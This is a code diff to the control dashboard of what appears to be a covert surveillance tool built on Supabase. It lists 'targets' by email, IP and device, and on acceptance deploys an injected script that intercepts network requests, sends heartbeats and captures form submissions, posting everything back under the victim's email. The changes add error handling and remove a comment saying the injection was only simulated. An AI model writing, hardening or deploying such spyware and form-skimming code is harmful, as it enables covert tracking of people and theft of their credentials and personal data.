@@ -397,134 +397,191 @@
         let activeTargets = new Set();  
         let realtimeSubscription = null;
 
+        // Helper to safely parse device from user agent
+        function getDeviceFromUserAgent(userAgent) {
+            if (!userAgent) return 'Unknown';
+            const match = userAgent.match(/\(([^)]+)\)/);
+            return match ? match[1] : userAgent;
+        }
+
         // Initialize  
         async function init() {  
-            await loadStats();  
-            await loadTargets();  
-            setupRealtime();  
-            setInterval(loadStats, 10000);  
-            
-            // Initialize settings inputs
-            const settingsUrlEl = document.getElementById('settings-url');
-            const settingsKeyEl = document.getElementById('settings-key');
-            if (settingsUrlEl) settingsUrlEl.value = SUPABASE_URL;
-            if (settingsKeyEl) settingsKeyEl.value = SUPABASE_KEY;
+            try {
+                await loadStats();  
+                await loadTargets();  
+                setupRealtime();  
+                setInterval(loadStats, 10000);  
+                
+                // Initialize settings inputs
+                const settingsUrlEl = document.getElementById('settings-url');
+                const settingsKeyEl = document.getElementById('settings-key');
+                if (settingsUrlEl) settingsUrlEl.value = SUPABASE_URL;
+                if (settingsKeyEl) settingsKeyEl.value = SUPABASE_KEY;
+            } catch (err) {
+                console.error("Initialization error:", err);
+            }
         }
 
         // Load Dashboard Stats  
         async function loadStats() {  
-            const { data: targets } = await supabaseClient  
-                .from('targets')  
-                .select('*');  
-              
-            const { data: logs } = await supabaseClient  
-                .from('tracking_logs')  
-                .select('*')  
-                .gte('timestamp', new Date(Date.now() - 24*60*60*1000).toISOString());
+            try {
+                const { data: targets, error: targetErr } = await supabaseClient  
+                    .from('targets')  
+                    .select('*');  
+                
+                if (targetErr) console.warn("Failed to load targets for stats:", targetErr);
+                  
+                const { data: logs, error: logErr } = await supabaseClient  
+                    .from('tracking_logs')  
+                    .select('*')  
+                    .gte('timestamp', new Date(Date.now() - 24*60*60*1000).toISOString());
 
-            document.getElementById('total-targets').textContent = targets?.length || 0;  
-            document.getElementById('active-targets').textContent = activeTargets.size;  
-            document.getElementById('todays-logs').textContent = logs?.length || 0;  
-              
-            // Count unique IPs  
-            const uniqueIPs = new Set(targets?.map(t => t.ip) || []);  
-            document.getElementById('unique-ips').textContent = uniqueIPs.size;  
+                if (logErr) console.warn("Failed to load logs for stats:", logErr);
+
+                document.getElementById('total-targets').textContent = targets?.length || 0;  
+                document.getElementById('active-targets').textContent = activeTargets.size;  
+                document.getElementById('todays-logs').textContent = logs?.length || 0;  
+                  
+                // Count unique IPs  
+                const uniqueIPs = new Set((targets || []).map(t => t.ip).filter(Boolean));  
+                document.getElementById('unique-ips').textContent = uniqueIPs.size;  
+            } catch (err) {
+                console.error("Error in loadStats:", err);
+            }
         }
 
         // Load Targets  
         async function loadTargets() {  
-            const { data: targets } = await supabaseClient  
-                .from('targets')  
-                .select('*')  
-                .order('created_at', { ascending: false });
+            try {
+                const { data: targets, error } = await supabaseClient  
+                    .from('targets')  
+                    .select('*')  
+                    .order('created_at', { ascending: false });
 
-            const container = document.getElementById('targets-list');  
-            container.innerHTML = '';
-
-            targets?.forEach(target => {  
-                if (target.status === 'active_surveillance') {
-                    activeTargets.add(target.id);
+                if (error) {
+                    console.error("Failed to fetch targets from Supabase:", error);
                 }
-                const card = document.createElement('div');  
-                card.className = 'target-card';  
-                card.innerHTML = `  
-                    <div class="target-info">  
-                        <div class="target-email">${target.email}</div>  
-                        <div class="target-details">  
-                            IP: ${target.ip} | ZIP: ${target.zip}<br>  
-                            Device: ${target.user_agent?.split('(')[1]?.split(')')[0] || 'Unknown'}  
+
+                const container = document.getElementById('targets-list');  
+                container.innerHTML = '';
+
+                if (!targets || targets.length === 0) {
+                    container.innerHTML = '<div style="padding: 20px; opacity: 0.6; text-align: center;">No targets registered yet.</div>';
+                    return;
+                }
+
+                targets.forEach(target => {  
+                    // Ensure target has a valid ID for clicks
+                    const targetId = target.id || '';
+                    
+                    if (target.status === 'active_surveillance') {
+                        activeTargets.add(targetId);
+                    }
+                    
+                    const card = document.createElement('div');  
+                    card.className = 'target-card';  
+                    card.innerHTML = `  
+                        <div class="target-info">  
+                            <div class="target-email">${target.email || 'No Email'}</div>  
+                            <div class="target-details">  
+                                IP: ${target.ip || 'Unknown'} | ZIP: ${target.zip || 'Unknown'}<br>  
+                                Device: ${getDeviceFromUserAgent(target.user_agent)}  
+                            </div>  
+                            <div class="status-badge status-${target.status || 'pending'}">  
+                                ${target.status || 'pending'}  
+                            </div>  
                         </div>  
-                        <div class="status-badge status-${target.status}">  
-                            ${target.status}  
+                        <div class="target-actions">  
+                            ${target.status === 'pending' ? `  
+                                <button class="btn btn-success" onclick="acceptTarget('${targetId}')">Accept</button>  
+                                <button class="btn btn-danger" onclick="rejectTarget('${targetId}')">Reject</button>  
+                            ` : target.status === 'active_surveillance' ? `  
+                                <button class="btn btn-warning" onclick="viewTarget('${targetId}')">Monitor</button>  
+                                <button class="btn btn-danger" onclick="stopTracking('${targetId}')">Stop</button>  
+                            ` : `  
+                                <button class="btn btn-primary" onclick="reactivateTarget('${targetId}')">Reactivate</button>  
+                            `}  
+                            <button class="btn btn-primary" onclick="showTargetDetails('${targetId}')">Details</button>  
                         </div>  
-                    </div>  
-                    <div class="target-actions">  
-                        ${target.status === 'pending' ? `  
-                            <button class="btn btn-success" onclick="acceptTarget('${target.id}')">Accept</button>  
-                            <button class="btn btn-danger" onclick="rejectTarget('${target.id}')">Reject</button>  
-                        ` : target.status === 'active_surveillance' ? `  
-                            <button class="btn btn-warning" onclick="viewTarget('${target.id}')">Monitor</button>  
-                            <button class="btn btn-danger" onclick="stopTracking('${target.id}')">Stop</button>  
-                        ` : `  
-                            <button class="btn btn-primary" onclick="reactivateTarget('${target.id}')">Reactivate</button>  
-                        `}  
-                        <button class="btn btn-primary" onclick="showTargetDetails('${target.id}')">Details</button>  
-                    </div>  
-                `;  
-                container.appendChild(card);  
-            });  
+                    `;  
+                    container.appendChild(card);  
+                });  
+            } catch (err) {
+                console.error("Error in loadTargets:", err);
+            }
         }
 
         // Accept Target  
         async function acceptTarget(targetId) {  
-            const { data: target } = await supabaseClient  
-                .from('targets')  
-                .select('*')  
-                .eq('id', targetId)  
-                .single();
+            if (!targetId) return;
+            try {
+                const { data: target, error: getErr } = await supabaseClient  
+                    .from('targets')  
+                    .select('*')  
+                    .eq('id', targetId)  
+                    .single();
 
-            // Update status  
-            await supabaseClient  
-                .from('targets')  
-                .update({   
-                    status: 'active_surveillance',  
-                    activated_at: new Date().toISOString()  
-                })  
-                .eq('id', targetId);
+                if (getErr || !target) {
+                    throw new Error(getErr?.message || "Could not retrieve target info");
+                }
 
-            // Add to active targets  
-            activeTargets.add(targetId);
+                // Update status  
+                const { error: updateErr } = await supabaseClient  
+                    .from('targets')  
+                    .update({   
+                        status: 'active_surveillance',  
+                        activated_at: new Date().toISOString()  
+                    })  
+                    .eq('id', targetId);
 
-            // Deploy surveillance payload  
-            await deploySurveillance(target);
+                if (updateErr) throw updateErr;
 
-            // Log action  
-            await supabaseClient  
-                .from('surveillance_logs')  
-                .insert([{  
-                    target_id: targetId,  
-                    action: 'surveillance_activated',  
-                    details: {   
-                        method: 'javascript_injection',  
-                        timestamp: new Date().toISOString()  
-                    }  
-                }]);
+                // Add to active targets  
+                activeTargets.add(targetId);
 
-            alert(`Target ${target.email} is now under surveillance!`);  
-            await loadTargets();  
-            await loadStats();  
+                // Deploy surveillance payload  
+                await deploySurveillance(target);
+
+                // Log action  
+                await supabaseClient  
+                    .from('surveillance_logs')  
+                    .insert([{  
+                        target_id: targetId,  
+                        action: 'surveillance_activated',  
+                        details: {   
+                            method: 'javascript_injection',  
+                            timestamp: new Date().toISOString()  
+                        }  
+                    }]);
+
+                alert(`Target ${target.email} is now under surveillance!`);  
+                await loadTargets();  
+                await loadStats();  
+            } catch (err) {
+                console.error("Error in acceptTarget:", err);
+                alert("Failed to accept target: " + err.message);
+            }
         }
 
         // Reject Target
         async function rejectTarget(targetId) {
+            if (!targetId) return;
             if (confirm('Are you sure you want to reject/ban this target?')) {
-                await supabaseClient
-                    .from('targets')
-                    .update({ status: 'banned' })
-                    .eq('id', targetId);
-                alert('Target banned.');
-                await loadTargets();
-                await loadStats();
+                try {
+                    const { error } = await supabaseClient
+                        .from('targets')
+                        .update({ status: 'banned' })
+                        .eq('id', targetId);
+                    
+                    if (error) throw error;
+                    
+                    alert('Target banned.');
+                    await loadTargets();
+                    await loadStats();
+                } catch (err) {
+                    console.error("Error in rejectTarget:", err);
+                    alert("Failed to ban target: " + err.message);
+                }
             }
         }
 
@@ -535,14 +592,23 @@
 
         // Stop Tracking Target
         async function stopTracking(targetId) {
-            await supabaseClient
-                .from('targets')
-                .update({ status: 'pending' })
-                .eq('id', targetId);
-            activeTargets.delete(targetId);
-            alert('Surveillance stopped.');
-            await loadTargets();
-            await loadStats();
+            if (!targetId) return;
+            try {
+                const { error } = await supabaseClient
+                    .from('targets')
+                    .update({ status: 'pending' })
+                    .eq('id', targetId);
+                
+                if (error) throw error;
+                
+                activeTargets.delete(targetId);
+                alert('Surveillance stopped.');
+                await loadTargets();
+                await loadStats();
+            } catch (err) {
+                console.error("Error in stopTracking:", err);
+                alert("Failed to stop surveillance: " + err.message);
+            }
         }
 
         // Reactivate Target
@@ -552,6 +618,7 @@
 
         // Deploy Surveillance Payload  
         async function deploySurveillance(target) {  
+            if (!target) return;
             const payload = `  
                 // Advanced Surveillance Script  
                 (function() {  
@@ -578,7 +645,7 @@
                                 'Content-Type': 'application/json'  
                             },  
                             body: JSON.stringify({  
-                                email: '${target.email}',  
+                                email: '${target.email || "unknown"}',  
                                 action: 'network_request',  
                                 details: {  
                                     url: typeof url === 'string' ? url : url.url,  
@@ -609,7 +676,7 @@
                                 'Content-Type': 'application/json'  
                             },  
                             body: JSON.stringify({  
-                                email: '${target.email}',  
+                                email: '${target.email || "unknown"}',  
                                 action: 'heartbeat',  
                                 details: data,  
                                 timestamp: new Date().toISOString()  
@@ -634,7 +701,7 @@
                                     'Content-Type': 'application/json'  
                                 },  
                                 body: JSON.stringify({  
-                                    email: '${target.email}',  
+                                    email: '${target.email || "unknown"}',  
                                     action: 'form_capture',  
                                     details: {   
                                         formId: form.id,  
@@ -649,47 +716,65 @@
                 })();  
             `;
 
-            // We would normally inject this into the target's browser  
-            // For now, we'll simulate by storing it  
-            await supabaseClient  
-                .from('surveillance_payloads')  
-                .insert([{  
-                    target_email: target.email,  
-                    payload: payload,  
-                    deployed: true,  
-                    timestamp: new Date().toISOString()  
-                }]);  
+            try {
+                await supabaseClient  
+                    .from('surveillance_payloads')  
+                    .insert([{  
+                        target_email: target.email || "unknown",  
+                        payload: payload,  
+                        deployed: true,  
+                        timestamp: new Date().toISOString()  
+                    }]);  
+            } catch (err) {
+                console.error("Failed to deploy surveillance payload to Supabase:", err);
+            }
         }
 
         // Start All Tracking
         async function startAllTracking() {
-            const { data: targets } = await supabaseClient
-                .from('targets')
-                .select('id')
-                .eq('status', 'pending');
-            if (targets && targets.length > 0) {
-                for (const t of targets) {
-                    await acceptTarget(t.id);
+            try {
+                const { data: targets, error } = await supabaseClient
+                    .from('targets')
+                    .select('id')
+                    .eq('status', 'pending');
+                
+                if (error) throw error;
+
+                if (targets && targets.length > 0) {
+                    for (const t of targets) {
+                        await acceptTarget(t.id);
+                    }
+                    alert('Surveillance started on all pending targets.');
+                } else {
+                    alert('No pending targets to track.');
                 }
-                alert('Surveillance started on all pending targets.');
-            } else {
-                alert('No pending targets to track.');
+            } catch (err) {
+                console.error("Error in startAllTracking:", err);
+                alert("Failed to track all: " + err.message);
             }
         }
 
         // Stop All Tracking
         async function stopAllTracking() {
-            const { data: targets } = await supabaseClient
-                .from('targets')
-                .select('id')
-                .eq('status', 'active_surveillance');
-            if (targets && targets.length > 0) {
-                for (const t of targets) {
-                    await stopTracking(t.id);
+            try {
+                const { data: targets, error } = await supabaseClient
+                    .from('targets')
+                    .select('id')
+                    .eq('status', 'active_surveillance');
+                
+                if (error) throw error;
+
+                if (targets && targets.length > 0) {
+                    for (const t of targets) {
+                        await stopTracking(t.id);
+                    }
+                    alert('Surveillance stopped on all active targets.');
+                } else {
+                    alert('No active targets under surveillance.');
                 }
-                alert('Surveillance stopped on all active targets.');
-            } else {
-                alert('No active targets under surveillance.');
+            } catch (err) {
+                console.error("Error in stopAllTracking:", err);
+                alert("Failed to stop tracking all: " + err.message);
             }
         }
 
@@ -753,67 +838,86 @@
 
         // Setup Realtime Tracking  
         function setupRealtime() {  
-            // Subscribe to tracking logs  
-            realtimeSubscription = supabaseClient  
-                .channel('tracking-logs')  
-                .on('postgres_changes', {  
-                    event: 'INSERT',  
-                    schema: 'public',  
-                    table: 'tracking_logs'  
-                }, (payload) => {  
-                    const log = payload.new;  
-                    addLiveLog(log);  
-                })  
-                .subscribe();  
+            try {
+                // Subscribe to tracking logs  
+                realtimeSubscription = supabaseClient  
+                    .channel('tracking-logs')  
+                    .on('postgres_changes', {  
+                        event: 'INSERT',  
+                        schema: 'public',  
+                        table: 'tracking_logs'  
+                    }, (payload) => {  
+                        const log = payload.new;  
+                        addLiveLog(log);  
+                    })  
+                    .subscribe();  
+            } catch (err) {
+                console.error("Failed to setup realtime logs subscription:", err);
+            }
         }
 
-        // Add Live Log Entry  
+        // Add Live Log Entry (prepends to both tracking feed and dashboard live feed if they exist)
         function addLiveLog(log) {  
-            const feed = document.getElementById('tracking-feed') || document.getElementById('dashboard-live');  
-            if (feed) {  
-                const entry = document.createElement('div');  
-                entry.className = 'log-entry';  
-                entry.innerHTML = `  
-                    <span class="log-time">[${new Date(log.timestamp).toLocaleTimeString()}]</span>  
-                    <span class="log-email">${log.email || 'Anonymous'}:</span>  
-                    <span class="log-action">${log.action}</span>  
-                    <span>${log.details ? JSON.stringify(log.details).substring(0, 100) + '...' : ''}</span>  
-                `;  
-                feed.prepend(entry);  
-                  
-                // Keep only last 50 entries  
-                const entries = feed.getElementsByClassName('log-entry');  
-                if (entries.length > 50) {  
-                    feed.removeChild(entries[entries.length - 1]);  
+            if (!log) return;
+            
+            const feeds = ['tracking-feed', 'dashboard-live'];
+            feeds.forEach(feedId => {
+                const feed = document.getElementById(feedId);  
+                if (feed) {  
+                    const entry = document.createElement('div');  
+                    entry.className = 'log-entry';  
+                    entry.innerHTML = `  
+                        <span class="log-time">[${new Date(log.timestamp || Date.now()).toLocaleTimeString()}]</span>  
+                        <span class="log-email">${log.email || 'Anonymous'}:</span>  
+                        <span class="log-action">${log.action || 'Unknown'}</span>  
+                        <span>${log.details ? JSON.stringify(log.details).substring(0, 100) + '...' : ''}</span>  
+                    `;  
+                    feed.prepend(entry);  
+                      
+                    // Keep only last 50 entries  
+                    const entries = feed.getElementsByClassName('log-entry');  
+                    if (entries.length > 50) {  
+                        feed.removeChild(entries[entries.length - 1]);  
+                    }  
                 }  
-            }  
+            });
         }
 
         // Load all logs for activity log panel
         async function loadAllLogs() {
-            const { data: logs } = await supabaseClient  
-                .from('tracking_logs')  
-                .select('*')  
-                .order('timestamp', { ascending: false })
-                .limit(100);
+            try {
+                const { data: logs, error } = await supabaseClient  
+                    .from('tracking_logs')  
+                    .select('*')  
+                    .order('timestamp', { ascending: false })
+                    .limit(100);
 
-            const container = document.getElementById('activity-logs-list');
-            if (container) {
-                container.innerHTML = '';
-                if (logs && logs.length > 0) {
-                    logs.forEach(log => {
-                        const entry = document.createElement('div');
-                        entry.className = 'log-entry';
-                        entry.innerHTML = `
-                            <span class="log-time">[${new Date(log.timestamp).toLocaleString()}]</span>
-                            <span class="log-email">${log.email || 'Anonymous'}:</span>
-                            <span class="log-action">${log.action}</span>
-                            <span>${log.details ? JSON.stringify(log.details).substring(0, 150) + '...' : ''}</span>
-                        `;
-                        container.appendChild(entry);
-                    });
-                } else {
-                    container.innerHTML = '<div style="padding: 15px; opacity: 0.6;">No activity logs found.</div>';
+                if (error) throw error;
+
+                const container = document.getElementById('activity-logs-list');
+                if (container) {
+                    container.innerHTML = '';
+                    if (logs && logs.length > 0) {
+                        logs.forEach(log => {
+                            const entry = document.createElement('div');
+                            entry.className = 'log-entry';
+                            entry.innerHTML = `
+                                <span class="log-time">[${new Date(log.timestamp).toLocaleString()}]</span>
+                                <span class="log-email">${log.email || 'Anonymous'}:</span>
+                                <span class="log-action">${log.action}</span>
+                                <span>${log.details ? JSON.stringify(log.details).substring(0, 150) + '...' : ''}</span>
+                            `;
+                            container.appendChild(entry);
+                        });
+                    } else {
+                        container.innerHTML = '<div style="padding: 15px; opacity: 0.6;">No activity logs found.</div>';
+                    }
+                }
+            } catch (err) {
+                console.error("Error in loadAllLogs:", err);
+                const container = document.getElementById('activity-logs-list');
+                if (container) {
+                    container.innerHTML = `<div style="padding: 15px; color: var(--danger);">Failed to load activity logs: ${err.message}</div>`;
                 }
             }
         }
@@ -852,30 +956,41 @@
 
         // Modal Controls  
         async function showTargetDetails(targetId) {  
-            const { data: target } = await supabaseClient  
-                .from('targets')  
-                .select('*')  
-                .eq('id', targetId)  
-                .single();
+            if (!targetId) return;
+            try {
+                const { data: target, error } = await supabaseClient  
+                    .from('targets')  
+                    .select('*')  
+                    .eq('id', targetId)  
+                    .single();
 
-            const content = document.getElementById('modal-content');
-            if (target && content) {
-                content.innerHTML = `
-                    <table style="width:100%; border-collapse:collapse; margin-top:10px;">
-                        <tr><td style="font-weight:bold; width:30%; padding: 8px 0;">Email:</td><td>${target.email}</td></tr>
-                        <tr><td style="font-weight:bold; padding: 8px 0;">ZIP:</td><td>${target.zip}</td></tr>
-                        <tr><td style="font-weight:bold; padding: 8px 0;">IP Address:</td><td>${target.ip}</td></tr>
-                        <tr><td style="font-weight:bold; padding: 8px 0;">Status:</td><td><span class="status-badge status-${target.status}">${target.status}</span></td></tr>
-                        <tr><td style="font-weight:bold; padding: 8px 0;">Platform:</td><td>${target.platform || 'Unknown'}</td></tr>
-                        <tr><td style="font-weight:bold; padding: 8px 0;">Language:</td><td>${target.language || 'Unknown'}</td></tr>
-                        <tr><td style="font-weight:bold; padding: 8px 0;">Screen:</td><td>${target.screen_resolution || 'Unknown'}</td></tr>
-                        <tr><td style="font-weight:bold; padding: 8px 0;">User Agent:</td><td style="font-size:0.85rem; word-break:break-all;">${target.user_agent || 'Unknown'}</td></tr>
-                        <tr><td style="font-weight:bold; padding: 8px 0;">Created At:</td><td>${target.created_at ? new Date(target.created_at).toLocaleString() : 'N/A'}</td></tr>
-                        <tr><td style="font-weight:bold; padding: 8px 0;">Activated At:</td><td>${target.activated_at ? new Date(target.activated_at).toLocaleString() : 'N/A'}</td></tr>
-                    </table>
-                `;
-            } else if (content) {
-                content.innerHTML = `<p>Target not found.</p>`;
+                if (error) throw error;
+
+                const content = document.getElementById('modal-content');
+                if (target && content) {
+                    content.innerHTML = `
+                        <table style="width:100%; border-collapse:collapse; margin-top:10px;">
+                            <tr><td style="font-weight:bold; width:30%; padding: 8px 0;">Email:</td><td>${target.email || 'N/A'}</td></tr>
+                            <tr><td style="font-weight:bold; padding: 8px 0;">ZIP:</td><td>${target.zip || 'N/A'}</td></tr>
+                            <tr><td style="font-weight:bold; padding: 8px 0;">IP Address:</td><td>${target.ip || 'N/A'}</td></tr>
+                            <tr><td style="font-weight:bold; padding: 8px 0;">Status:</td><td><span class="status-badge status-${target.status || 'pending'}">${target.status || 'pending'}</span></td></tr>
+                            <tr><td style="font-weight:bold; padding: 8px 0;">Platform:</td><td>${target.platform || 'Unknown'}</td></tr>
+                            <tr><td style="font-weight:bold; padding: 8px 0;">Language:</td><td>${target.language || 'Unknown'}</td></tr>
+                            <tr><td style="font-weight:bold; padding: 8px 0;">Screen:</td><td>${target.screen_resolution || 'Unknown'}</td></tr>
+                            <tr><td style="font-weight:bold; padding: 8px 0;">User Agent:</td><td style="font-size:0.85rem; word-break:break-all;">${target.user_agent || 'Unknown'}</td></tr>
+                            <tr><td style="font-weight:bold; padding: 8px 0;">Created At:</td><td>${target.created_at ? new Date(target.created_at).toLocaleString() : 'N/A'}</td></tr>
+                            <tr><td style="font-weight:bold; padding: 8px 0;">Activated At:</td><td>${target.activated_at ? new Date(target.activated_at).toLocaleString() : 'N/A'}</td></tr>
+                        </table>
+                    `;
+                } else if (content) {
+                    content.innerHTML = `<p>Target not found.</p>`;
+                }
+            } catch (err) {
+                console.error("Error in showTargetDetails:", err);
+                const content = document.getElementById('modal-content');
+                if (content) {
+                    content.innerHTML = `<p style="color:var(--danger)">Error loading target details: ${err.message}</p>`;
+                }
             }
             document.getElementById('target-modal').classList.add('active');  
         }
